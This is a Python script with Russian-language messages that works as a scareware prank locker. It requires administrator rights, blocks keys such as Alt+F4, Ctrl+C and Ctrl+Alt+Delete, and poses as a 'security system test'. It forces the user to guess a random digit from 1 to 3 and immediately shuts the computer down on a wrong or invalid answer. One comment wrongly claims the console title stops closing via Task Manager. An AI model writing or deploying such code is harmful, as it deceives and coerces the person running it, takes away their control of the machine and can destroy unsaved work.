import os
import random
import sys
import ctypes
import time
import keyboard
import colorama
from colorama import Fore, init

# Инициализация цветного текста
init()
RED = Fore.RED
RESET = Fore.RESET

# Проверка прав администратора (обязательно)
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print(f"{RED}ОШИБКА: Запустите программу от имени администратора!{RESET}")
    time.sleep(3)
    sys.exit()

# Блокировка клавиш (Alt+F4, Ctrl+C и т.д.)
def block_keys():
    keyboard.block_key("alt+f4")
    keyboard.block_key("ctrl+c")
    keyboard.block_key("ctrl+break")
    keyboard.block_key("ctrl+alt+delete")
    keyboard.block_key("esc")

# Установка заголовка CMD (чтобы нельзя было закрыть через диспетчер задач)
ctypes.windll.kernel32.SetConsoleTitleW("Системная проверка | Не закрывать!")

# Основная логика
def main():
    block_keys()
    safe_number = random.randint(1, 3)
    
    print(f"{RED}ВНИМАНИЕ: Это тест системы безопасности.{RESET}")
    print(f"{RED}Закройте это окно — компьютер выключится!{RESET}\n")
    print(f"{RED}Введите цифру от 1 до 3 (безопасный код сгенерирован)...{RESET}")
    
    try:
        user_input = int(input(">>> "))
    except:
        print(f"{RED}Ошибка: введите число!{RESET}")
        os.system("shutdown /s /t 0")
        return
    
    if user_input == safe_number:
        print(f"{RED}Правильно! Система разблокирована.{RESET}")
        time.sleep(3)
        sys.exit()
    else:
        print(f"{RED}ОШИБКА! Неверный код. Выключение...{RESET}")
        os.system("shutdown /s /t 0")

if __name__ == "__main__":
    main()